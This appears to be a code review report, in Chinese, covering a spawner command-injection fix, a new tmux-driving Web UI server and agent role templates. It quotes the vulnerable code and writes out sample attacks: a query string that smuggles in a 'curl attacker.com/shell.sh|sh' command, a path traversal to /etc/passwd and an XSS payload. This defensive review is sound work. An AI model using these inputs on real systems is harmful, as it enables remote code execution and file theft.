# Code Review Round 2 — spawner 修复验证 + Web UI 安全审查 + ROLE.md 模板审查

**Date**: 2026-03-15
**Reviewer**: reviewer
**Scope**: spawner.ts 变更、新增 src/server/ (Web UI)、ROLE.md 模板

---

## 一、spawner.ts 命令注入修复验证

**Commit**: `7fd9048 fix(spawner): eliminate command injection via execFileSync`

### 已修复

- L130, L137-140, L148, L199, L212, L219: 所有 `execSync` 改为 `execFileSync` 数组参数 ✅
- 前台模式 `spawnForeground` 使用 `node-pty` spawn，无 shell 解析 ✅
- send-script 通过环境变量传递参数而非 shell 拼接 ✅

### 残留问题（lead 已识别）

**L143**: `pipe-pane` 的 `-o` 参数是 tmux 内部的 shell 命令：
```ts
execFileSync("tmux", ["pipe-pane", "-t", session, "-o", `cat >> ${logPath}`]);
```
虽然 `execFileSync` 避免了 Node 层面 shell 解析，但 tmux 会将 `-o` 内容传给 `/bin/sh`。若 `logPath` 含空格或元字符（如 `$(cmd)`），仍可注入。

**建议**: 使用 shell 引号包裹：`` `cat >> '${logPath.replace(/'/g, "'\\''")}'` `` 或改用 tmux 自身的日志功能。

---

## 二、Web UI 安全审查（P0 — 严重）

**新增文件**: `src/server/index.ts` (171 行), `src/server/frontend.html` (327 行)

### P0-1: 命令注入 — server/index.ts L92, L109, L126, L150, L154

**所有 tmux 交互使用 `execSync` 拼接字符串**，且 `session` 和 `keys` 来自客户端 WebSocket 消息：

```ts
// L92 — roleName 来自 URL query parameter
execSync(`tmux has-session -t ${session} 2>/dev/null`);

// L109 — 同源
execSync(`tmux capture-pane -t ${session} -p -S -200`, ...);

// L150 — keys 来自 WebSocket 客户端输入
execSync(`tmux send-keys -t ${session} -l ${JSON.stringify(keys)}`, ...);

// L154 — cols/rows 来自客户端
execSync(`tmux resize-window -t ${session} -x ${msg.cols} -y ${msg.rows}`, ...);
```

**攻击向量**: 连接 `ws://host:8080?role=foo;curl attacker.com/shell.sh|sh` 即可远程代码执行。

**这是网络暴露的 RCE 漏洞，比 spawner.ts 的本地注入严重得多。**

**建议**:
1. 所有 tmux 调用改用 `execFileSync` 数组参数
2. 白名单校验 `roleName`（仅允许 `[a-zA-Z0-9_-]`）
3. `cols`/`rows` 强制 parseInt 并限范围

### P0-2: 路径遍历 — server/index.ts L51

```ts
const logPath = path.join(runtimeDir(root), `${req.params.name}.log`);
```

`req.params.name` 未校验，攻击者可请求 `/api/roles/../../etc/passwd.log` 读取任意文件。

**建议**: 校验 `req.params.name` 仅含 `[a-zA-Z0-9_-]`，或 resolve 后检查是否在 runtimeDir 内。

### P0-3: 无认证 — server/index.ts L166

```ts
server.listen(port, "0.0.0.0", () => { ... });
```

服务监听 `0.0.0.0`（所有接口），无任何认证。局域网或公网可直接访问并执行命令。

**建议**: 默认绑定 `127.0.0.1`，添加 token/password 认证。

### P1-1: XSS — frontend.html L124, L138-146

`renderSidebar` 和 `renderDashboard` 使用 `innerHTML` 直接插入从 API 获取的 `role.name`、`role.description` 等字段。若角色名含 HTML（如 `<img onerror=alert(1)>`），可 XSS。

**建议**: 使用 `textContent` 或 escape HTML。

### P1-2: 空 catch 块 — server/index.ts L93, L113, L139, L158

所有 tmux 调用的错误被静默吞掉，调试困难。

---

## 三、ROLE.md 模板审查

### 行数检查（≤500 行）

| 文件 | 模板源 (ts) | 部署文件 (md) | 状态 |
|------|------------|--------------|------|
| lead | 150 行 | 133 行 | ✅ |
| executor | 128 行 | 112 行 | ✅ |
| reviewer | 127 行 | 111 行 | ✅ |

### 内容审查

**正面**:
- 三个模板结构一致：自我演进协议 → 开发协议 → 硬性规则 → 协作网格 → 记忆系统
- 硬性规则（第三章）明确标注不可自我修改
- Loop 执行流程清晰、步骤可操作

**问题**:
1. **模板参数签名不一致** — `leadRoleMd(projectName: string)` 使用参数，`executorRoleMd()` 和 `reviewerRoleMd()` 无参数，但 `RoleTemplate` 接口定义 `roleMd: (projectName: string) => string`。TypeScript 允许忽略多余参数不报错，但设计不一致。
2. **git pull 指令引用不存在的 remote** — 所有模板指示 `git pull --rebase origin main`，但项目无 remote 配置。首次 loop 始终会报错。建议改为条件执行或检测 remote 存在性。
3. **Lead 模板独有的第六章（Lead 专属协议）** — 合理的职责分离，无问题。

---

## 审查统计（本轮新增/变更代码）

| 维度 | 评分 | 说明 |
|------|------|------|
| 正确性 | 7/10 | spawner 修复大部分正确，pipe-pane 残留一个 |
| 可读性 | 7/10 | Web UI 代码结构清晰，但空 catch 块影响可维护性 |
| 性能 | 6/10 | Web UI 每 500ms 执行 execSync 轮询 tmux，阻塞事件循环 |
| 安全性 | 2/10 | Web UI 引入了网络暴露的 RCE、路径遍历、无认证 |
| 测试覆盖 | 0/10 | 仍然零测试 |
| **综合** | **4.4/10** | 安全性严重倒退 |
